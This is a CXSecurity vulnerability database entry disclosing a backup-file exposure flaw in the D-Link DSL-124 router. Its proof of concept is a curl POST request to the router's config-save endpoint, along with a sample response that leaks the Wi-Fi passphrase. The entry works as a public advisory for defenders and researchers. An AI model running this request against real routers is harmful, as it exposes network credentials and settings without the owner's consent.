---
title: DSL-124 Wireless N300 ADSL2+ - Backup File Disclosure
url: https://cxsecurity.com/issue/WLB-2023040011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-03
fetch_date: 2025-10-04T11:29:05.957666
---

# DSL-124 Wireless N300 ADSL2+ - Backup File Disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **DSL-124 Wireless N300 ADSL2+ - Backup File Disclosure** **2023.04.02**  **![sg](https://cert.cx/cxstatic/images/flags/sg.png) [Aryan Chehreghani](https://cxsecurity.com/author/Aryan%2BChehreghani/1/) **(SG)** ![sg](https://cert.cx/cxstatic/images/flags/sg.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: DSL-124 Wireless N300 ADSL2+ - Backup File Disclosure
# Date: 2022-11-10
# Exploit Author: Aryan Chehreghani
# Vendor Homepage: https://www.dlink.com
# Software Link: https://dlinkmea.com/index.php/product/details?det=dU1iNFc4cWRsdUpjWEpETFlSeFlZdz09
# Firmware Version: ME\_1.00
# Tested on: Windows 11
# [ Details - DSL-124 ]:
#The DSL-124 Wireless N300 ADSL2+ Modem Router is a versatile, high-performance router for a home or small office,
#With integrated ADSL2/2+, supporting download speeds up to 24 Mbps, firewall protection,
#Quality of Service (QoS),802.11n wireless LAN, and four Ethernet switch ports,
#the Wireless N300 ADSL2+ Modem Router provides all the functions that a user needs to establish a secure and high-speed link to the Internet.
# [ Description ]:
#After the administrator enters and a new session is created, the attacker sends a request using the post method in her system,
#and in response to sending this request, she receives a complete backup of the router settings,
#In fact this happens because of the lack of management of users and sessions in the network.
# [ POC ]:
Request :
curl -d "submit.htm?saveconf.htm=Back+Settings" -X POST http://192.168.1.1/form2saveConf.cgi
Response :
HTTP/1.1 200 OK
Connection: close
Server: Virtual Web 0.9
Content-Type: application/octet-stream;
Content-Disposition: attachment;filename="config.img"
Pragma: no-cache
Cache-Control: no-cache
<Config\_Information\_File\_8671>
<V N="WLAN\_WPA\_PSK" V="pass@12345"/>
<V N="WLAN\_WPA\_PSK\_FORMAT" V="0x0"/>
<V N="WLAN\_WPA\_REKEY\_TIME" V=""/>
<V N="WLAN\_ENABLE\_1X" V="0x0"/>
<V N="WLAN\_ENABLE\_MAC\_AUTH" V="0x0"/>
<V N="WLAN\_RS\_IP" V="0.0.0.0"/>
.
.
.
</Config\_Information\_File\_8671>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 8
 -1

88%

12%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top